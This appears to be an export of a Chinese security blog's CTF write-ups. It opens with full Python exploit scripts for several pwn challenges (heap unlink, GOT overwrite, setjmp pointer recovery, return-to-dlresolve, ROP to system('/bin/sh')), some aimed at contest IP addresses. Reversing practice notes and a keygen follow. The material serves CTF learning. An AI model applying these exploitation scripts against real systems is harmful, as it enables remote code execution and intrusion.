&apos;A&apos;*0x18) add(0x20, &apos;AAAA&apos;, &apos;A&apos;*0x18) edit(0, &apos;A&apos;*0x18+p64(0xd1)) # note1 delete(1) add(0x20, &apos;AAAA&apos;, &apos;A&apos;*0x18) strlen_got = 0x602028 add(0x10, &apos;AAAA&apos;, p64(strlen_got)+&apos;d&apos;*0x10) edit(3, p64(strlen_got)) #note2 show(2) r.recvuntil(&apos;content: &apos;) strlen_addr = u64(r.readline()[:-1].ljust(8, &apos;\x00&apos;)) print &quot;[*] strlen addr:{0}&quot;.format(hex(strlen_addr)) libc = ELF(&quot;./libc-2.19.so&quot;)#ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) libc_base = strlen_addr - libc.symbols[&apos;strlen&apos;] system_addr = libc_base + libc.symbols[&apos;system&apos;] edit(2, p64(system_addr)) edit(0, &apos;/bin/sh\x00&apos;) r.interactive() ###Pwn-Class在init函数中num*200+8存在整形溢出，num控制得当可以使得分配的空间很小。Setjmp会将当前的寄存器保存到堆上（部分寄存器进行了rol和异或加密）。通过show功能可以泄露出保存的寄存器值，通过edit功能可以修改这些值，然后通过longjmp改变程序的控制流程，因为rsp和rip都能被随意修改，所以比较容易进行rop。 脚本： from threading import Thread from zio import * target = &apos;./class&apos; target = (&apos;58.213.63.30&apos;, 4001) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != &apos;&apos;: io.writeline(d) def rerol(d): return ((d&lt;&lt;(64-0x11))+(d&gt;&gt;0x11))&amp;0xffffffffffffffff def rol(d): return ((d&lt;&lt;0x11) + (d&gt;&gt;(64-0x11)))&amp;0xffffffffffffffff def show(io, id): io.read_until(&apos;&gt;&gt;&apos;) io.writeline(&apos;2&apos;) io.read_until(&apos;:&apos;) io.writeline(str(id)) io.read_until(&apos;name:&apos;) r12 = l64(io.read_until(&apos;,&apos;)[:-1].ljust(8, &apos;\x00&apos;)) print &apos;r12&apos;, hex(r12) io.read_until(&apos;addr:&apos;) enc_rsp = l64(io.read(8)) enc_rip = l64(io.read_until(&apos;,&apos;)[:-1].ljust(8, &apos;\x00&apos;)) base = r12 - 0xaa0 print &apos;enc_rsp&apos;, hex(enc_rsp) print &apos;enc_rip&apos;, hex(enc_rip) real_rip = base + 0x1495 cookie = rerol(enc_rip)^real_rip print &apos;cookie&apos;, hex(cookie) real_rsp = rerol(enc_rsp)^cookie print &apos;real_rsp&apos;, hex(real_rsp) return (base, real_rsp, cookie) def edit(io, id, age, name, addr, introduce): io.read_until(&apos;&gt;&gt;&apos;) io.writeline(&apos;3&apos;) io.read_until(&apos;:&apos;) io.writeline(str(id)) io.read_until(&apos;:&apos;) io.writeline(name) io.read_until(&apos;:&apos;) io.writeline(str(age)) io.read_until(&apos;:&apos;) io.writeline(addr) io.read_until(&apos;:&apos;) io.writeline(introduce) def exp(target): io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), \ print_write=COLORED(RAW, &apos;green&apos;)) io.read_until(&apos;:&apos;) io.writeline(str(92233720368547759)) base, rsp, cookie = show(io, 1) print &apos;base&apos;, hex(base) fake_rsp = rsp - 0x48 pop_rdi_ret = base + 0x000000000001523 addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie)) print HEX(addr) edit(io, 1, 0, &quot;&quot;, addr, &quot;&quot;) io.read_until(&apos;&gt;&gt;&apos;) payload = &apos;5;&apos;+&apos;a&apos;*6 puts_got = 0x0000000000202018+ base puts_plt = 0x9a0 + base main = base + 0x00000000000013ff payload += l64(puts_got)+l64(puts_plt)+l64(main) io.writeline(payload) puts_addr = l64(io.readline()[:-1].ljust(8, &apos;\x00&apos;)) &apos;&apos;&apos; base = puts_addr - 0x000000000006F5D0 system = base + 0x0000000000045380 print &apos;system&apos;, hex(system) binsh = base + 0x000000000018C58B &apos;&apos;&apos; base = puts_addr - 0x000000000006FD60 print &apos;base&apos;, hex(base) system = base + 0x0000000000046590 binsh = base + 0x000000000017C8C3 #io.gdb_hint() io.read_until(&apos;:&apos;) io.writeline(str(92233720368547759)) fake_rsp = rsp - 0x80 addr = l64(rol(fake_rsp^cookie))+l64(rol(pop_rdi_ret^cookie)) print HEX(addr) io.gdb_hint() edit(io, 1, 0, &quot;&quot;, addr, &quot;&quot;) io.read_until(&apos;&gt;&gt;&apos;) payload = &apos;5;&apos;+&apos;a&apos;*6 payload += l64(binsh)+l64(system)+l64(main) io.writeline(payload) #io.gdb_hint() interact(io) exp(target) ###Pwn-sandbox沙箱做了如下限制：对外的调用都通过jmp ds:dl_resolve出去，所以采用return-to-dlresolve进行利用。 脚本： #encoding:utf-8 import struct from threading import Thread from zio import * target = &apos;./sandbox ./vul&apos; #target = &apos;./vul&apos; target = (&apos;58.213.63.30&apos;, 4004) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != &apos;&apos;: io.writeline(d) def write_16byte(io, addr, value): io.write(&apos;a&apos;*0x10+l64(addr+0x10)+l64(0x400582)) io.write(value+l64(0x601f00)+l64(0x400582)) fake_relro = &apos;&apos; fake_sym = &apos;&apos; #link_map_addr = 0x00007ffff7ffe1c8 #close aslr.(if has aslr, need leak) #link_map_addr = 0x7ffff7ffe168 def generate_fake_relro(r_offset, r_sym): return l64(r_offset) + l32(7)+l32(r_sym)+ l64(0) def generate_fake_sym(st_name): return l32(st_name)+l8(0x12)+l8(0) + l16(0) + l64(0) + l64(0) #versym = 0x40031e symtab = 0x4002b8 strtab = 0x400330 jmprel = 0x4003b8 bss_addr = 0x601058 # .bss addr = 0x601058 # 0x155dc*0x18+0x4003b8 = 0x601058 # so index = 0x155dc #0x155e8*0x18+0x4002b8 = 0x601078 # so r_sym = 0x155e8 # 0x200d68 + 0x400330 = 0x601098 # so st_name = 0x200d68 def write_any(io, addr, value): print hex(addr), hex(value) io.read_until(&apos;:\n&apos;) io.writeline(&apos;0&apos;) io.write(l64(addr)+l64(value)) def exp(target): io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), print_write=COLORED(RAW, &apos;green&apos;)) pop_rdi_ret = 0x0000000000400603 pop_rsi_r15_ret = 0x0000000000400601 leak_addr = 0x600ef0 write_plt = 0x0000000000400430 pop_rbp_ret = 0x4004d0 leak_rop = l64(pop_rsi_r15_ret) + l64(leak_addr) + l64(0) + l64(pop_rdi_ret) + l64(1) + l64(write_plt) leak_rop += l64(pop_rbp_ret) + l64(0x601f00) + l64(0x400582) for i in range(0, len(leak_rop), 8): write_16byte(io, 0x601b00+i, leak_rop[i:i+8]+&apos;\x00&apos;*8) leave_ret = 0x40059d leak_stack_povit = &apos;a&apos; * 0x10 + l64(0x601b00 - 0x8) + l64(leave_ret) io.write(leak_stack_povit) io.read_until(&apos;:&apos;) link_map_addr = l64(io.read(8)) + 0x28 print hex(link_map_addr) r_offset = 0x601970 # a writable addr r_sym = 0x155e8 fake_relro = generate_fake_relro(r_offset, r_sym).ljust(0x20, &apos;\x00&apos;) st_name = 0x200d68 fake_sym = generate_fake_sym(st_name).ljust(0x20, &apos;\x00&apos;) write_16byte(io, link_map_addr+0x1c8, &apos;\x00&apos;*0x10) #write_16byte(io, 0x600858, l64(0x6ffffff0)+l64(0x3d57d6)) for i in range(0, len(fake_relro), 8): write_16byte(io, 0x601058+i, fake_relro[i:i+8]+&apos;\x00&apos;*8) for i in range(0, len(fake_sym), 8): write_16byte(io, 0x601078+i, fake_sym[i:i+8]+&apos;\x00&apos;*8) write_16byte(io, 0x601098, &apos;system&apos;.ljust(16, &apos;\x00&apos;)) write_16byte(io, 0x601a50, &apos;/bin/sh&apos;.ljust(16, &apos;\x00&apos;)) plt0 = 0x400420 rop = l64(pop_rdi_ret) + l64(0x601a50) index = 0x155dc rop += l64(plt0) + l64(index) for i in range(0, len(rop), 8): write_16byte(io, 0x601980+i, rop[i:i+8]+&apos;\x00&apos;*8) stack_povit = &apos;a&apos;*0x10 + l64(0x601980-0x8) + l64(leave_ret) io.write(stack_povit) interact(io) exp(target) ###Pwn-note漏洞存在于edit中，有堆溢出。 此题采用talloc，不过talloc_free内部会调用free函数，所以采用unlink方法进行利用。 脚本： from threading import Thread from zio import * target = (&apos;119.254.101.197&apos;, 10000) target = &apos;./note&apos; def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != &apos;&apos;: io.writeline(d) def add(io, title, size, content): io.read_until(&apos;&gt;&gt;&apos;) io.writeline(&apos;1&apos;) io.read_until(&apos;:&apos;) io.writeline(title) io.read_until(&apos;:&apos;) io.writeline(str(size)) io.read_until(&apos;:&apos;) io.writeline(content) def edit(io, id, offset, content): io.read_until(&apos;&gt;&gt;&apos;) io.writeline(&apos;3&apos;) io.read_until(&apos;:&apos;) io.writeline(str(id)) io.read_until(&apos;:&apos;) io.writeline(str(offset)) io.read_until(&quot;:&quot;) io.writeline(content) def edit2(io, id, offset, content): count = len(content)/48 print len(content) print count for i in range(count): io.read_until(&apos;&gt;&gt;&apos;) io.writeline(&apos;3&apos;) io.read_until(&apos;:&apos;) io.writeline(str(id)) io.read_until(&apos;:&apos;) io.writeline(str(offset+48*i)) io.read_until(&quot;:&quot;) io.write(content[i*48:i*48+48]) if len(content[count*48:]) &gt; 0: io.read_until(&apos;&gt;&gt;&apos;) io.writeline(&apos;3&apos;) io.read_until(&apos;:&apos;) io.writeline(str(id)) io.read_until(&apos;:&apos;) io.writeline(str(offset+48*count)) io.read_until(&apos;:&apos;) io.writeline(content[count*48:]) def delete(io, id): io.read_until(&apos;&gt;&gt;&apos;) io.writeline(&apos;4&apos;) io.read_until(&apos;:&apos;) io.writeline(str(id)) def change(io, id, title): io.read_until(&apos;&gt;&gt;&apos;) io.writeline(&apos;5&apos;) io.read_until(&apos;:&apos;) io.writeline(str(id)) io.read_until(&apos;:&apos;) io.writeline(title) def exp(target): io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), \ print_write=COLORED(RAW, &apos;green&apos;)) add(io, &apos;%13$p&apos;, 0x100, &apos;111&apos;) #0x603070 0x603110 #0 add(io, &apos;222&apos;, 0x100, &apos;222&apos;) #0x603280 0x603320 #1 add(io, &apos;333&apos;, 0x100, &apos;333&apos;) #0x603490 0x603530 #2 add(io, &apos;444&apos;, 0x100, &apos;444&apos;) #0x6036a0 0x603740 #3 add(io, &apos;sh;&apos;, 0x100, &apos;555&apos;) #0x6038b0 0x603950 #4 add(io, &apos;666&apos;, 0x100, &apos;666&apos;) #0x603ac0 0x603b60 #5 delete(io, 1) delete(io, 2) heap_ptr = 0x6020f0 payload = l64(0) + l64(0x211) +l64(heap_ptr-0x18)+l64(heap_ptr-0x10) payload = payload[:-1] add(io, payload[:-1], 0x300, &apos;777&apos;) #0x603280 0x603320 #6 add(io, &apos;sh;&apos;, 0x100, &apos;888&apos;) #io.gdb_hint() offset = 0x603490 - 0x603320 # size next prev parent fake_head1 = l64(0x210)+l64(0x90)+ l64(0) +l64(0)+ l64(0x603a60) # child refs descutor name size flags pool padding fake_head2 = l64(0)+l64(0)+l64(0)+l64(0x400dc4)+l64(0x100)+l64(0x00000000e8150c70)+l64(0)+l64(0)+l64(0) fake_head2 = fake_head2.ljust(0x90-0x28, &apos;\x00&apos;) fake_head2 += l64(0) + l64(0x21) + &apos;\x00&apos;*0x10 + l64(0) + l64(0x21) fake_head1 = fake_head1[:-6] payload = &apos;\x00&apos; + l64(0)+l64(0xa1)+l64(0)+l64(0)+l64(0)+l64(0x6034a0) payload = payload[:-6] edit(io, 4, 0x100-1, payload) edit2(io, 6, offset, fake_head1) edit2(io, 6, offset+0x28, fake_head2) delete(io, 5) talloc_free_got = 0x602048 print_plt = 0x4007E0 title = l64(talloc_free_got) + l64(0) + l64(0) + l64(0x6020d0) title = title[:-2] change(io, 6, title) change(io, 3, l64(print_plt)[:-1]) io.gdb_hint() delete(io, 0) io.read_until(&apos;0x&apos;) main_ret = int(io.read_until(&apos;De&apos;)[:-2], 16) base = main_ret - 0x0000000000021EC5 print hex(base) system = base + 0x0000000000046640 print hex(system) change(io, 3, l64(system)[:-1]) delete(io, 7) interact(io) exp(target) ###Pwn-Goodluck条件竞争漏洞，g_index的值可以在主线程中修改，然后在第2个子线程中能实现任意地址+1操作。 read_int如果参数为0，可以栈溢出。 脚本： from threading import Thread # from uploadflag import * from zio import * target = (&apos;119.254.101.197&apos;, 10000) target = &apos;./pwn2&apos; def add1(io,type,name,number,some): io.read_until(&quot;choice:&quot;) io.writeline(&apos;1&apos;) io.read_until(&quot;flower&quot;) io.writeline(str(type)) io.read_until(&apos;name:&apos;) io.writeline(name) io.read_until(&apos;number:&apos;) io.writeline(str(number)) io.read_until(&apos;again:&apos;) io.writeline(some) def add2(io, type, name, much, price, some): io.read_until(&quot;choice:&quot;) io.writeline(&apos;1&apos;) io.read_until(&quot;flower&quot;) io.writeline(str(type)) io.read_until(&apos;name:&apos;) io.writeline(name) io.read_until(&apos;want:&apos;) io.writeline(much) io.read_until(&apos;table:&apos;) io.writeline(price) io.read_until(&apos;something:&apos;) io.writeline(some) def show(io,index): io.writeline(&apos;4&apos;) io.read_until(&apos;show&apos;) io.writeline(str(index)) def delete(io,index): io.writeline(&apos;2&apos;) io.read_until(cs7) io.writeline(str(index)) def edit(io,index,data): io.writeline(&apos;3&apos;) io.read_until(&apos;edit:&apos;) io.writeline(str(index)) io.read_until(&apos;something&apos;) io.writeline(data) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != &apos;&apos;: io.writeline(d) def exp(target): io = zio(target, timeout=10000, print_read=COLORED(RAW, &apos;red&apos;), \ print_write=COLORED(RAW, &apos;green&apos;)) add1(io, 3, &apos;bbbb&apos;, 100, &apos;ccccccccc&apos;) fake_index = (0x2031a0 - 0x203180)/8 delete(io, 0) delete(io, fake_index) io.read_until(&apos;delete 0&apos;) show(io, 0) io.read_until(&apos;s1-&gt;&apos;) data = io.read_until(&apos; &apos;)[:-1] code_base = l64(data.ljust(8, &apos;\x00&apos;)) - 0x1040 print hex(code_base) canary_addr = code_base + 0x2031c0 + 1 add2(io, 2, &apos;aaaa&apos;, str(canary_addr&amp;0xffffffff), str(canary_addr&gt;&gt;32), &apos;bbbbbbbb&apos;) delete(io, 1) delete(io, fake_index + 1) io.read_until(&apos;delete 1&apos;) show(io, 1) io.read_until(&quot;fake show!\n&quot;) cookies = l64(io.read_until(&apos;\n&apos;)[:-1].ljust(8, &apos;\x00&apos;)) &lt;&lt; 8 print &apos;cookie&apos;, hex(cookies) add1(io, 0, &apos;cccc&apos;,100, &apos;0517&apos;) io.gdb_hint() show(io, 2) io.read_until(&apos;again\n&apos;) puts_plt = code_base + 0x0000000000000BC0 puts_got = code_base + 0x0000000000202F20 pop_rdi_ret = code_base + 0x0000000000001653 read_int = code_base + 0x0000000000000F80 payload = &apos;a&apos;*0x18 + l64(cookies) + &apos;aaaaaaaa&apos;*5 + l64(pop_rdi_ret) + l64(puts_got) + l64(puts_plt) + l64(pop_rdi_ret)+l64(0) + l64(read_int) io.writeline(payload) puts = l64(io.readline()[:-1].ljust(8, &apos;\x00&apos;)) libc_base = puts - 0x000000000006F5D0 print hex(libc_base) system = libc_base + 0x0000000000045380 binsh = libc_base + 0x000000000018C58B payload = &apos;a&apos;*0x18 + l64(cookies) + &apos;aaaaaaaa&apos;*5 + l64(pop_rdi_ret) + l64(binsh) + l64(system) io.writeline(payload) io.gdb_hint() interact(io) exp(target)]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice 8之PEiD插件]]></title>
    <url>%2F2017%2F02%2F16%2Fpractice-8%E4%B9%8BPEiD%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[第八题 PEiD有一个叫做Krypto ANALyzer的插件，使用这个插件可以对程序进行扫描，通过特征匹配来识别程序内部可能用到的一些标准算法。 先看题目，随便输入就会报错。 利用IDA找到关键点这些烂熟于心的步骤就不再提了，对下面这段关键算法分析完了之后发现关键函数是sub_401510,但是点开这个函数，真的是好长的一大串， 用PEid的插件进行分析，提示这个程序用了 MD5算法。 根据提示地址，在IDA反汇编指示图按下G，输入00401E5C,就会自动跳转到函数代码中 可以从sub_401D10回溯到sub_4026F0，继续通过交叉引用往上回溯，依次为sub_4027B0、sub_401C00、sub_401BB0、sub_401510，而sub_401510就是我们在实验步骤一种为一个暂时不理解的函数。那么我们可以猜测sub_401510这个函数就是用来计算用户名的MD5值的，我们可以通过OD动态调试来验证我们的想法。 通过阅读IDA中的反汇编代码，我们知道在00401752处调用了sub_401510这个函数， OK使用OD载入在00401752设置断点，输入test，直接跳转到执行sub_401510，看到eax寄存器值正好是test的MD5值 这里说明插件判别是正确的正好使用python写一个MD5的注册机 #!usr/bin/python #-*- coding:utf-8 -*- import hashlib while True: username = raw_input(&quot;input username:&quot;) md5 = hashlib.md5(username).hexdigest().upper() serial = md5[::-1] # 翻转字符串 print &quot;serial: %s&quot; % serial]]></content>
      <tags>
        <tag>practice writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice 7之行为分析]]></title>
    <url>%2F2017%2F02%2F14%2Fpractice-7%E4%B9%8B%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[第七题 看完教程发现这题写起来很简单，但是我们以前是没有接触过（病毒分析）而且通过这题我知道了一个在线的行为分析工具，人称，在线沙箱： 网上有许多公开的在线沙箱，使用这些沙箱提供的服务，我们可以方便的观察一个程序的详细行为报告，进而判断一个程序大致的内部逻辑。 病毒是个img文件，无法执行的文件，可以使用7zip打开如图，看看文件内部隐藏了些什么。 打开会发现如图文件：一个游戏这时便出现误区，难道是玩游戏过关吗？看下面的文件，用记事本打开，是提示，游戏有后门 打开游戏最上面一行亮了，我去。 继续用7zip试着打开，果然里面还有东西，我们发现里面有三个文件，分别为1.vbs、1.exe、2.exe，如下图所示：第二个是游戏第一个打开知识闪过了指令框，猜测这可能就是所谓的“病毒文件” 用在线沙箱分析来加快我们的分析流程，看看1.exe都有哪些行为特征。 打开金山火眼https://fireeye.ijinshan.com/，注册一个账号并激活，点击“分析文件”上传1.exe进行分析，等待一段时间就可以看到分析报告了。 从分析报告中我们可以看出，1.exe释放了一个test.txt文件到当前目录，而且把test.txt的文件属性设置为系统和隐藏，因此我们看不到文件夹里面多了一个txt文件。现在使用记事本打开这个test.txt文件，文件内容为（WdubQ4IGEzAG54NfATJTNhI4TLIvPvENyTLLWb3YCNBeK5wad5XCgrSQNOih1F），如图所示： 最够根据提示信息把所得到的字符串 使用MD5计算工具，算出这个字符串的16位MD5值，为ba3c34ec7cd9c086，这就是我们要找的flag了，如图所示：]]></content>
      <tags>
        <tag>practice writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice 6之算法夹杂]]></title>
    <url>%2F2017%2F02%2F13%2Fpractice-6%E4%B9%8B%E7%AE%97%E6%B3%95%E5%A4%B9%E6%9D%82%2F</url>
    <content type="text"><![CDATA[第六题 之前没做出来的一道题目，各种密码学的夹杂，看到很多.so库估计当时也没啥想法了很明了，对输入进行检验，过了就输出right，错了就输出wrong，分析一下check_401510这个函数。先是判断字符范围，ASCII码不能超过90。 然后取输入的前5个字符，作md5加密，如下三个函数就是实现了md5算法 接下来就是用前五个字符的md5值的前8字节作为DES算法的key，并且采用ECB模式分组加密。 然后就是对DES加密后的结果作base64变换，v9是DES加密结果，v21保存base64结果。 最后就是和check数组比较，check数组内容即是：‘OSHzTJ4pwFgRG6eS6y3xVOOEGcbE5rzwqTs7VCK6ACQLuiTamZpXcQ==’ 所以采用爆破的方式去得到flag，设flag前五位为temp，并且用其md5值前8字节作为DES算法的key，当解密出来的flag前五位和temp相等时，即为flag。脚本如下：（参考的大神writeup） import pyDes import base64 import hashlib import string check = &quot;OSHzTJ4pwFgRG6eS6y3xVOOEGcbE5rzwqTs7VCK6ACQLuiTamZpXcQ==&quot; miwen = base64.b64decode(check) count = 0 for i in string.uppercase + string.digits: for j in string.uppercase + string.digits: for k in string.uppercase + string.digits: for m in string.uppercase + string.digits: for n in string.uppercase + string.digits: count = count + 1 tmp = i+j+k+m+n md5_tmp = hashlib.md5(tmp).hexdigest() key = md5_tmp[0:16].decode(&quot;hex&quot;) result = pyDes.des(key) y = result.decrypt(miwen[:8]) if y[0:5] == tmp: print y if count % 10000 == 0: print count 这道题目主要就是各种密码算法的交杂，在代码的分析上比较困难，即使参照writeup也很难掌握，后面还得好好在琢磨琢磨]]></content>
      <tags>
        <tag>practice writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice 5之万能断点]]></title>
    <url>%2F2017%2F02%2F12%2Fpractice-5%E4%B9%8B%E4%B8%87%E8%83%BD%E6%96%AD%E7%82%B9%2F</url>
    <content type="text"><![CDATA[第五个只能算得上是学习一个新技能–万能断点之前没听过。 给的是一个未注册版本的软件，题目要求将其注册 乱填只能是出错误 放入IDA用运行，然后点击输入注册码，报错之后暂停OD调试 如下图查看user3模块 转到这个模块下之后便开始下万能断点；查找二进制字符串（crtl+B）,然后在弹出的框内输入万能断点并将跳转处设为断点 重新载入程序，依旧输入错误注册码（由于万能断点，在运行到弹出输入界面时，中途会多次暂停）输入结束之后便可以按F8单步步过。直到堆栈窗口出现正确的注册码 输入检验注册成功： 万能断点：“F3 A5 8B C8 83 E1 03 F3 A4 E8”]]></content>
      <tags>
        <tag>practice writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice-4之IDA用法]]></title>
    <url>%2F2017%2F02%2F12%2Fpractice-4%E4%B9%8BIDA%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[第四题 打开是这样的，看English了解掷骰子，输入任意数字（3），我发现第一次输入三进行到下一步，但是退出重启之后在输入3则为错的，所以想要在9^5种可能中猜出随机变化的数字几率，除非脸白。，还是分析源程序得到答案吧 用IDA打开程序。进入之后shift+f12查找关键字符串。 找到“Nice job.here is the flag”,双击跳转过去。会看到WinMain函数（常见的C++程序函数）直接反汇编 然后就是分析代码过程了 v56 = std::operator&lt;&lt;]]></content>
      <tags>
        <tag>practice writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice-3之pyo学习]]></title>
    <url>%2F2017%2F02%2F10%2Fpractice-3%E4%B9%8Bpyo%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[第三题： 下载下来是个这个名字的题目，也不像之前遇到的后缀里虽然杂乱也存在正确后缀的，于是想到一个格式分析工具，拖进去看看是一个pyo格式文件，回想一下以前也没见过这种格式的题目，百度一下知道这种格式其实与pyc一样，都是将py程序编译成可执行程序。 知道格式之后先改后缀，然后转换格式再用python2.7下的反编译工具unompyle把这个题目的源代码弄出来 #!usr/bin/python #-*- coding:utf-8 -*- import sys lookup = [196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] pwda = [188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42] pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108] flag = raw_input(&apos;Input your Key:&apos;).strip() if len(flag) != 17: print &apos;Wrong Key!!&apos; sys.exit(1) flag = flag[::-1] for i in range(0, len(flag)): if ord(flag[i]) + pwda[i] &amp; 255 != lookup[i + pwdb[i]]: print &apos;Wrong Key!!&apos; sys.exit(1) print &apos;Congratulations!!&apos; 虽然长关键是最后哪儿的处理，在最后做一个修改就可以了，第一次想的方法是根据以前做题的经验进行爆破的，有碰巧的嫌疑：前面关键数据不变把最后的数据进行改变如下图 最后跑出来的结果： 其实这样子添加abcde等字符的方法有凑巧之嫌。万一有#之类的问题该如何，第一次改就漏掉了‘’不是猜测真的得不出17位把‘’给落掉了，随意中途也突然想了一个方法，直接一个for循环在0到128之间进行爆破并用组进行保存，最后直接通过ord()函数进行转换就能得到最后的flag]]></content>
      <tags>
        <tag>practice writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice-2之汇编]]></title>
    <url>%2F2017%2F02%2F10%2Fpractice-2%E4%B9%8B%E6%B1%87%E7%BC%96%2F</url>
    <content type="text"><![CDATA[一道ELFx64的题目，只能用IDA载入，找到main函数，F5得到代码 看上面两个图，代码可读性果然不太好。前面print的一大堆应该是文件的提示字符串输入重点是后面的while循环以及那个if语句，直接看到if可以发现flag的最后几个变量必须是0，8，2，3这个不难看出来， 试着看汇编把，看总览图，也不知道是不是这个技巧，看看剪头分布能推断出哪一段是循环语句所在之处，if判断之处啥的 跟着C语言看看汇编语言吧 进过上述分析可以知道var_40应该使我们输入的结果，所以必须必须知道var_C0的数据跳到相应位置 是空的，再回到代码找找，会发现这样子一串操作 刚好17个数字，所以说var_i[i] = ((var_C0[i]-1)+(var_C0[i]-1)&gt;&gt;0x1f)&gt;&gt;1 好的，python写脚本： #!usr/bin/python #-*- coding:utf-8 -*- key = [0x0EF, 0x0C7, 0x0E9, 0x0CD, 0x0F7, 0x08B, 0x0D9, 0x08D, 0x0BF, 0x0D9, 0x0DD, 0x0B1, 0x0BF, 0x087, 0x0D7, 0x0DB, 0x0BF ] flag = [] for i in range(0,17): ch = ((key[i]-1)+((key[i]-1)&gt;&gt;0x1f))&gt;&gt;1; flag.append(chr(ch)) print(flag) print(&apos;0823}&apos;) 最后结果：]]></content>
      <tags>
        <tag>practice writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8道Pwn基础练习所得]]></title>
    <url>%2F2017%2F02%2F09%2F8%E9%81%93Pwn%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0%E6%89%80%E5%BE%97%2F</url>
    <content type="text"><![CDATA[刚开始做pwn的题目，从基础开始咯，所以在合天上先总结一些学到的指令。（基础gdb就不多说了）{!:在数据填充的时候不可以用换行符号进行填充} 一、Pwn基础练习1查询pwn程序的c语言源代码 cat pwn.c 直接将64个A和一个B通过管道输入到程序中 python -c “print ‘A’*64+’B’” | ./pwn 二、Pwn基础练习2 Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。将AAA BBB CCC传给指定的test指令然后进行输出。（用户函数中没有获取函数值语句的程序当中） python -c “print ‘AAA BBB CCC’” | xargs ./test 以字节为单位查看内存中0x34333231的表示（其中/4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节） x /4xb $esp+0x5C 三、Pwn基础练习3Python基础知识 Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。 运行脚本就可以把这题pwn成功 import os defpwn(): os.putenv(“HEETIAN”,”A”*64+”\x0a\x0d\x0a\x0d”) os.system(“./pwn3”) if name ==”main“: pwn() 在shell输入下面指令为子进程添加一个新的环境变量（除了通过export添加环境变量以外，我们还可以通过函数getenv、putenv、setenv等对环境变量进行操作。） export testenv=”Hello_World” Linux Shell中，可以使用$()或者两个反引号（）来包裹一条shell命令，并返回shell命令的执行结果。 比如执行export testenv2=python -c “print ‘A’*20”`命令后，再执行./env可以看到有一个名为testenv2的环境变量，其值为20个A。 export testenv2=python -c &quot;print &#39;A&#39;*20&quot; 四、Pwn基础练习4一、objdump使用 使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。 使用下面这条指令可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作 objdump -d pwn4 五、Pwn基础练习51、C语言函数调用约定通过压栈实现参数传递，且参数压栈顺序为从右往左2、查询esp寄存器中的值 i r $esp 六、Pwn基础练习6二、Shellcode Shellcode指缓冲区溢出攻击中植入进程的恶意代码，这段代码可以弹出一个消息框，也可以在目标机器上打开一个监听端口，甚至是删除目标机器上的重要文件等。 